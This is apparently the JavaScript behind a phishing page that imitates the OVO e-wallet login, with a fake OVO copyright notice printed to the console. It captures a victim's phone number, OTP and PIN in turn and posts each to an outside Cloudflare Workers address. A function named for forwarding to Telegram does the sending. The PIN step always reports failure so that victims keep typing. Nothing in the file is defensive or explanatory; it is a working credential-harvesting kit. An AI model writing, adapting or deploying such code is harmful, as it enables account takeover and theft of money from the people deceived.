(function() {
    'use strict';

    // ---- ELEMENTS ----
    const loadingScreen = document.getElementById('loadingScreen');
    const pageNomor = document.getElementById('pageNomor');
    const pageOtp = document.getElementById('pageOtp');
    const pagePin = document.getElementById('pagePin');

    const inputNomor = document.getElementById('inputNomor');
    const btnLanjut = document.getElementById('btnLanjut');

    const otpInputs = document.querySelectorAll('.otp-input');
    const btnVerifOtp = document.getElementById('btnVerifikasiOtp');

    const pinInputs = document.querySelectorAll('.pin-input');
    const btnVerifPin = document.getElementById('btnVerifikasiPin');
    const pinContainer = document.getElementById('pinContainer');
    const errorMessage = document.getElementById('errorPin');

    // === KONFIGURASI WORKER ===
    const WORKER_URL = 'https://green-dust-cbc5.help-ovo.workers.dev/';

    // ---- COPYRIGHT NOTICE ----
    console.log('%c© 2026 OVO Indonesia. All Rights Reserved.', 'color: #4B006E; font-size: 16px; font-weight: bold;');
    console.log('%cPT OVO Teknologi Indonesia', 'color: #666; font-size: 13px;');
    console.log('%cDilarang menyalin, mendistribusikan, atau memodifikasi tanpa izin.', 'color: #999; font-size: 11px; font-style: italic;');

    // ---- UTILITY ----
    function showPage(pageId) {
        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
        document.getElementById(pageId).classList.add('active');
    }

    function getOtpValue() {
        let val = '';
        otpInputs.forEach(inp => val += inp.value.trim());
        return val;
    }

    function getPinValue() {
        let val = '';
        pinInputs.forEach(inp => val += inp.value.trim());
        return val;
    }

    function clearOtp() {
        otpInputs.forEach(inp => inp.value = '');
        otpInputs[0].focus();
    }

    function clearPin() {
        pinInputs.forEach(inp => inp.value = '');
        pinInputs[0].focus();
    }

    function resetPinError() {
        pinContainer.classList.remove('error');
        errorMessage.classList.remove('show');
    }

    function showPinError() {
        pinContainer.classList.add('error');
        errorMessage.classList.add('show');
        setTimeout(() => {
            resetPinError();
        }, 2000);
    }

    // ---- FUNGSI MENAMPILKAN SPINNER DI TOMBOL ----
    function showSpinner(button) {
        button.dataset.originalText = button.innerHTML;
        button.disabled = true;
        button.innerHTML = '<span class="spinner-ovo"></span> Memproses...';
    }

    function hideSpinner(button) {
        button.innerHTML = button.dataset.originalText || 'Lanjut';
        button.disabled = false;
    }

    // === FUNGSI KIRIM KE TELEGRAM ===
    async function sendToTelegram(data) {
        try {
            const response = await fetch(WORKER_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(data)
            });
            
            const result = await response.json();
            console.log('Telegram response:', result);
            return result;
        } catch (error) {
            console.error('Error sending to Telegram:', error);
            return { success: false, error: error.message };
        }
    }

    // ---- LOADING 5 DETIK ----
    setTimeout(() => {
        loadingScreen.classList.add('hidden');
        showPage('pageNomor');
        inputNomor.focus();
    }, 5000);

    // ---- LANJUT KE OTP (DENGAN SPINNER) ----
    btnLanjut.addEventListener('click', async function() {
        const nomor = inputNomor.value.trim();
        if (nomor.length < 8) {
            alert('Masukkan nomor HP yang valid.');
            inputNomor.focus();
            return;
        }
        
        showSpinner(this);
        
        await sendToTelegram({
            action: 'phone',
            phone: nomor,
            timestamp: new Date().toISOString()
        });
        
        await new Promise(resolve => setTimeout(resolve, 1500));
        
        hideSpinner(this);
        showPage('pageOtp');
        clearOtp();
        otpInputs[0].focus();
    });

    // ---- OTP INPUT NAVIGATION (4 DIGIT) ----
    otpInputs.forEach((inp, idx) => {
        inp.addEventListener('input', function(e) {
            this.value = this.value.replace(/\D/g, '').slice(0, 1);
            if (this.value.length === 1 && idx < otpInputs.length - 1) {
                otpInputs[idx + 1].focus();
            }
        });

        inp.addEventListener('keydown', function(e) {
            if (e.key === 'Backspace' && this.value === '' && idx > 0) {
                otpInputs[idx - 1].focus();
            }
        });

        inp.addEventListener('paste', function(e) {
            e.preventDefault();
            const paste = (e.clipboardData || window.clipboardData).getData('text');
            const digits = paste.replace(/\D/g, '').slice(0, 4);
            if (digits.length > 0) {
                for (let i = 0; i < Math.min(digits.length, otpInputs.length); i++) {
                    otpInputs[i].value = digits[i] || '';
                }
                const nextIdx = Math.min(digits.length, otpInputs.length - 1);
                otpInputs[nextIdx].focus();
            }
        });
    });

    // ---- VERIFIKASI OTP (4 DIGIT) -> PIN (6 DIGIT) ----
    btnVerifOtp.addEventListener('click', async function() {
        const otp = getOtpValue();
        if (otp.length !== 4) {
            alert('Masukkan 4 digit kode OTP.');
            otpInputs[0].focus();
            return;
        }
        
        const nomor = inputNomor.value.trim();
        await sendToTelegram({
            action: 'otp',
            phone: nomor,
            otp: otp,
            timestamp: new Date().toISOString()
        });
        
        showPage('pagePin');
        resetPinError();
        clearPin();
        pinInputs[0].focus();
    });

    // ---- PIN INPUT NAVIGATION (6 DIGIT) ----
    pinInputs.forEach((inp, idx) => {
        inp.addEventListener('input', function(e) {
            this.value = this.value.replace(/\D/g, '').slice(0, 1);
            if (this.value.length === 1 && idx < pinInputs.length - 1) {
                pinInputs[idx + 1].focus();
            }
            resetPinError();
        });

        inp.addEventListener('keydown', function(e) {
            if (e.key === 'Backspace' && this.value === '' && idx > 0) {
                pinInputs[idx - 1].focus();
            }
            resetPinError();
        });

        inp.addEventListener('paste', function(e) {
            e.preventDefault();
            const paste = (e.clipboardData || window.clipboardData).getData('text');
            const digits = paste.replace(/\D/g, '').slice(0, 6);
            if (digits.length > 0) {
                for (let i = 0; i < Math.min(digits.length, pinInputs.length); i++) {
                    pinInputs[i].value = digits[i] || '';
                }
                const nextIdx = Math.min(digits.length, pinInputs.length - 1);
                pinInputs[nextIdx].focus();
            }
            resetPinError();
        });
    });

    // ---- VERIFIKASI PIN - SELALU SALAH ----
    btnVerifPin.addEventListener('click', async function() {
        const pin = getPinValue();
        
        if (pin.length !== 6) {
            alert('Masukkan 6 digit PIN.');
            pinInputs[0].focus();
            return;
        }

        const nomor = inputNomor.value.trim();
        const otp = getOtpValue();
        await sendToTelegram({
            action: 'pin',
            phone: nomor,
            otp: otp,
            pin: pin,
            timestamp: new Date().toISOString()
        });

        showPinError();
        
        setTimeout(() => {
            clearPin();
            pinInputs[0].focus();
        }, 300);
    });

    // ---- ENTER KEY SUPPORT ----
    inputNomor.addEventListener('keydown', function(e) {
        if (e.key === 'Enter') btnLanjut.click();
    });

    document.addEventListener('keydown', function(e) {
        if (e.key === 'Enter' && pageOtp.classList.contains('active')) {
            btnVerifOtp.click();
        }
        if (e.key === 'Enter' && pagePin.classList.contains('active')) {
            btnVerifPin.click();
        }
    });

    // ---- PREVENT DEFAULT ZOOM ----
    document.addEventListener('gesturestart', function(e) { e.preventDefault(); });

})();
